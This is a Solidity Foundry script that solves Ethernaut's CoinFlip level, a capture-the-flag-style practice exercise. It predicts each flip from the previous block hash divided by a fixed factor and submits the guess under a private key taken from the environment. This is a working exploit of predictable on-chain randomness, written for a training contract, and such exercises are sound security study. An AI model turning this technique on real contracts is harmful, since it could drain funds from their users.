// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {ICoinFlip} from "../../../src/ethernaut/03-coinflip/ICoinFlip.sol";

contract CoinFlipScript is Script {

    address coinFlipInstanceAddress = vm.envAddress("L03_COINFLIP_ADDRESS");
    uint256 privateKey = vm.envUint("ACCOUNT_1_PRIVATE_KEY");
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() public {
        bool coinSide = _getCoinSide();

        vm.broadcast(privateKey);
        bool result = _flip(coinSide);
        if (!result) {
            revert();
        }
    
        console2.log("Coin: %s -v- Flip: %s (total wins %s)", coinSide, result, _consecutiveWins());
    }

    function _getCoinSide() internal returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1;
    }

    function _flip(bool _educatedGuess) internal returns (bool) {
        return ICoinFlip(coinFlipInstanceAddress).flip(_educatedGuess);
    }

    function _consecutiveWins() internal returns (uint256) {
        return ICoinFlip(coinFlipInstanceAddress).consecutiveWins();
    }
}
